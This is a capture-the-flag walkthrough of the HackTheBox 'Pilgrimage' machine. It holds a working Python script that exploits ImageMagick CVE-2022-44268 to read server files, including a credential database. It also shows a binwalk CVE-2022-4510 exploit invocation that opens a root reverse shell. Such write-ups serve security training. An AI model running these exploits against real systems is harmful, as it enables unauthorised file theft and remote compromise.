# Pilgrimage

A HackTheBox Linux [machine](https://app.hackthebox.com/machines/549) created by [coopertim13](https://app.hackthebox.com/users/55851) features:

* ImageMagick Vulnerability
* Binwalk RCE Vulnerability

## Reconnaissance

### Port Scanning

We found ports `22` and`80` open on the target.

```bash
$ sudo nmap -n -Pn -oN ports.nmap -p- -sS -T4 --min-rate 1000 -v <IP>
```

### Website

We see the website `http://pilgrimage.htb` hosted on the target, which we shall add to our host file `/etc/hosts`, and the usage of Nginx from HTTP response.

```bash
$ curl -i http://10.129.250.151
HTTP/1.1 301 Moved Permanently
Server: nginx/1.18.0
Date: Sun, 25 Jun 2023 03:52:11 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://pilgrimage.htb/
```

We see that the site provides an image-uploading function for registered users.

We registered a user and uploaded an image for testing, and we first found that we could insert content via the parameters `message` and `status=success`.

<figure><figcaption></figcaption></figure>

<figure><figcaption></figcaption></figure>

By reviewing the page `/dashboard.php`, we also found that

* the user name
* the original image name

will be embedded in the page `/dashboard.php`.

<figure><figcaption></figcaption></figure>

### Git Repository

By fuzzing, we found the path `.git` exists.

```bash
$ fuff -u http://pilgrimage.htb/FUZZ -w path_to_raft_medium_files.txt
...
.git                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 11ms]
...
$ curl http://pilgrimage.htb/.git/HEAD
ref: refs/heads/master
```

We can then try to use [`git-dumper`](https://github.com/arthaud/git-dumper) to get the Git repository of source codes of the site.

```bash
$ git-dumper http://pilgrimage.htb pilgrimage.git
```

## Initial Access

### CVE-2022-44268

We found the usage of the executable `magick` from the repository we fetched

{% code overflow="wrap" %}
```bash
$ ls -aF prilgrimage.git/
./  ../  assets/  dashboard.php*  .git/  index.php*  login.php*  logout.php*  magick*  register.php*  vendor/
```
{% endcode %}

{% code title="index.php" overflow="wrap" %}
```php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $image = new Bulletproof\Image($_FILES);
  if($image["toConvert"]) {
    $image->setLocation("/var/www/pilgrimage.htb/tmp");
    $image->setSize(100, 4000000);
    $image->setMime(array('png','jpeg'));
    $upload = $image->upload();
    if($upload) {
      $mime = ".png";
      $imagePath = $upload->getFullPath();
      if(mime_content_type($imagePath) === "image/jpeg") {
        $mime = ".jpeg";
      }
      $newname = uniqid();
      exec("/var/www/pilgrimage.htb/magick convert /var/www/pilgrimage.htb/tmp/" . $upload->getName() . $mime . " -resize 50% /var/www/pilgrimage.htb/shrunk/" . $newname . $mime);
```
{% endcode %}

We can see the version of the executable is `ImageMagick 7.1.0-49`.

```bash
$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

It seems that there's a file read vulnerability we could exploit.

{% embed url="https://github.com/voidz0r/CVE-2022-44268" %}

### Automation

To automate the process, we write the following Python script to read the file content and store it in file `result`:

{% code overflow="wrap" %}
```python
#!/usr/bin/python3

import re, os, sys, shlex
import cmd
import subprocess
from requests import Session

USER = 'tester@example.com'
PASS = 's3cRet'
POC = 'https://github.com/voidz0r/CVE-2022-44268'
WORKDIR = '/tmp/imagick_reader'

try:
    os.system("mkdir -p %s" % WORKDIR)
    os.chdir(WORKDIR)
except FileNotFoundError as e:
    print(e)
    sys.exit(-1)

os.system('sh -c "[ -d poc ] || git clone \"%s\" poc"' % POC)

class Reader(cmd.Cmd):
    def __init__(self, username, passwd):
        super().__init__()
        self.s = Session()
        self.url = 'http://pilgrimage.htb'
        self.proxies = {
                'http': 'http://localhost:8080'
                }
        self.login()

    def login(self):
        data = {
                'username': USER,
                'password': PASS
                }
        res = self.s.post(self.url+'/login.php', data=data, proxies=self.proxies)
        if not 'Shrunken Image URL' in res.text:
            self.register()

    def register(self):
        data = {
                'username': USER,
                'password': PASS
                }
        res = self.s.post(self.url+'/register.php', data=data, proxies=self.proxies)
        if not 'Shrunken Image URL' in res.text:
            print('register fail')

    def readFile(self, path):
        subprocess.check_call(shlex.split('cargo run --manifest-path poc/Cargo.toml "%s"' % path))
        with open('image.png', 'rb') as f:
            files = {
                    'toConvert':('dog.png', f, 'image/jpeg')
                    }
            res = self.s.post(self.url+'/', files=files, proxies=self.proxies)
            imgUrl = re.match(r'.*message=(?P<url>.*)&.*$', res.url).group('url')
            subprocess.check_call(shlex.split("wget \"%s\" -O res.png" % imgUrl))
            content = subprocess.Popen(shlex.split('sh -c "identify -verbose res.png | grep \"^[0-9]\" | xxd -r -p"'), stdout=subprocess.PIPE).communicate()[0]
            print(content)
            with open('result', 'wb') as f:
                f.write(content)

    def do_EOF(self, _):
        return True

    def emptyline(self):
        pass
    
    def default(self, cmd):
        self.readFile(cmd)

r = Reader(USER, PASS)
r.cmdloop()
```
{% endcode %}

We can read the file on the target now.

<figure><figcaption></figcaption></figure>

### SQLite File

We've seen that the site stores user's credentials in the SQLite file `/var/db/pilgrimage` from the source code file `login.php`.

<figure><figcaption><p>login.php</p></figcaption></figure>

We thus get the SQLite file content via the Python script.

{% code overflow="wrap" %}
```bash
(Cmd) /var/db/pilgrimage
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `poc/target/debug/cve-2022-44268 /var/db/pilgrimage`
--2023-06-25 17:08:11--  http://pilgrimage.htb/shrunk/64986667291ed.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.129.250.151
Connecting to pilgrimage.htb (pilgrimage.htb)|10.129.250.151|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1192 (1.2K) [image/png]
Saving to: ‘res.png’

res.png               100%[========================>]   1.16K  --.-KB/s    in 0s      

2023-06-25 17:08:11 (214 MB/s) - ‘res.png’ saved [1192/1192]

b'SQLite format 3\x00\x10\x00\x01\x01\x00@  \x00\x00\x00\x9a\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00
```
{% endcode %}

Using `sqlite3`, we can dump the table `users` and get user Emily's password `abigchonkyboi123`:

```bash
$ sqlite3 result
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> select * from users;
emily|abigchonkyboi123
tester@example.com|s3cRet
```

We can later use the credentials found to login to the target via SSH.

<figure><figcaption></figcaption></figure>

## Privilege Escalation

### Malware Scanning

With `systemctl`, we found a service named `malwarescan` is running.

```bash
$ systemctl status
...
             ├─malwarescan.service 
             │ ├─685 /bin/bash /usr/sbin/malwarescan.sh
             │ ├─708 /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/
             │ └─709 /bin/bash /usr/sbin/malwarescan.sh
...
$ systemctl cat malwarescan.service
# /etc/systemd/system/malwarescan.service
[Unit]
Description=Embedded malware scanner for imgshrink uploads

[Service]
User=root
WorkingDirectory=/root/quarantine
ExecStart=/usr/sbin/malwarescan.sh
Restart=always

[Install]
WantedBy=multi-user.target
```

We inspected the script `malwarescan.sh` and found the usage of `inotifywait` and `binwalk`.

{% code overflow="wrap" %}
```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```
{% endcode %}

The `binwalk` is of version `v2.3.2`:

<figure><figcaption></figcaption></figure>

### CVE-2022-4510

We found the `binwalk` of version `v2.3.2` has a RCE vulnerability `CVE-2022-4510` with a public exploit.

{% embed url="https://www.exploit-db.com/exploits/51249" %}

We use the exploit to generate a malicious png file and upload the image to the path `/var/www/pilgrimage.htb/shrunk/`.

```bash
$ ./poc.py <file> <ip> <port>
```

The script `malwarescan.sh` will extract the malicious png file with `binwalk` and extract the embedded malicious Python code to the `binwalk` plugins directory; hence we shall get our reverse shell running with root.

<figure><figcaption></figcaption></figure>

## Miscellaneous

### CVE-2022-4510

From the pull request, we can see the exploit is achieved by abusing the Python function `os.path.join` to extract malicious `binwalk` module to the directory `.config/binwalk/plugins` which can then be executed and thus lead to RCE.

> An attacker could craft a malicious PFS file that would cause binwalk to write outside the extraction directory. I attached a proof-of-concept (poc.zip) that, when extracted from the user's home directory, would extract a malicious binwalk module in .config/binwalk/plugins. This malicious plugin would then be loaded and executed by binwalk, leading to RCE.

Refer to the pull request.

{% embed url="https://github.com/ReFirmLabs/binwalk/pull/617" %}

Here's the commit fixing the vulnerability.

{% embed url="https://github.com/qkaiser/binwalk/commit/696fe34ed680ffd951bfeca737feb4a0b98dde5c" %}
